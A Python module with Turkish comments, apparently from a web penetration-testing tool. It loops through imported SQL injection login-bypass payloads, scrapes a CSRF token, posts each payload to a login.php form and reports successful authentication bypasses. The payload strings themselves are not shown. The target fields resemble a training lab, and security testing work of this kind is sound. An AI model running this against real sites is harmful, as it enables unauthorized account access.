# -*- coding: utf-8 -*-
"""SQL Injection ile Login Bypass test modülü"""

import re
import requests

from .base import BaseModule
from ..utils import Colors, Printer
from ..payloads import LOGIN_BYPASS_PAYLOADS
from ..config import CSRF_TOKEN_PATTERN


class LoginBypassModule(BaseModule):
    """SQL Injection ile login bypass testlerini çalıştıran modül"""

    MODULE_NAME = "SQL INJECTION LOGIN BYPASS TESTLERİ"

    def run(self):
        """SQL Injection ile kimlik doğrulama bypass denemesi"""
        Printer.section(self.MODULE_NAME)

        login_url = f"{self.session.base_url}/login.php"

        for i, bypass in enumerate(LOGIN_BYPASS_PAYLOADS, 1):
            self.stats["total"] += 1

            print(f"\n  {Colors.DIM}[{i}/{len(LOGIN_BYPASS_PAYLOADS)}] "
                  f"{bypass['description']}{Colors.RESET}")
            print(f"  {Colors.DIM}Kullanıcı : {bypass['username'][:40]}{Colors.RESET}")
            print(f"  {Colors.DIM}Şifre     : {bypass['password'][:40]}{Colors.RESET}")

            try:
                # Her denemede yeni session kullan
                bypass_session = requests.Session()
                bypass_session.verify = False

                # Login sayfasını al
                resp = bypass_session.get(login_url, timeout=10)

                # CSRF token'ı çıkar
                match = re.search(CSRF_TOKEN_PATTERN, resp.text)
                token = match.group(1) if match else None

                # Bypass denemesi
                login_data = {
                    "username": bypass["username"],
                    "password": bypass["password"],
                    "Login": "Login",
                }
                if token:
                    login_data["user_token"] = token

                resp = bypass_session.post(
                    login_url, data=login_data, timeout=10, allow_redirects=True
                )

                # Bypass başarılı mı kontrol et
                is_bypassed = False

                # index.php'ye yönlendirme olduysa
                if "index.php" in resp.url and "login.php" not in resp.url:
                    # İçeriği doğrula
                    check = bypass_session.get(
                        f"{self.session.base_url}/index.php", timeout=10
                    )
                    if "login.php" not in check.url:
                        is_bypassed = True

                # Welcome mesajı varsa
                if "Welcome" in resp.text and "Login failed" not in resp.text:
                    is_bypassed = True

                if is_bypassed:
                    self.stats["success"] += 1
                    self.stats["auth_bypass"] += 1
                    Printer.auth_bypass(
                        f"  Kullanıcı: {bypass['username']}\n"
                        f"  {Colors.RED}{Colors.BOLD}  Şifre: {bypass['password']}\n"
                        f"  {Colors.RED}{Colors.BOLD}  Yöntem: {bypass['description']}"
                    )
                else:
                    self.stats["failed"] += 1
                    Printer.fail(
                        f"{bypass['description']} → Login bypass başarısız"
                    )

                bypass_session.close()

            except Exception as e:
                self.stats["failed"] += 1
                Printer.fail(f"{bypass['description']} → Hata: {str(e)}")

            if i < len(LOGIN_BYPASS_PAYLOADS):
                self.wait()
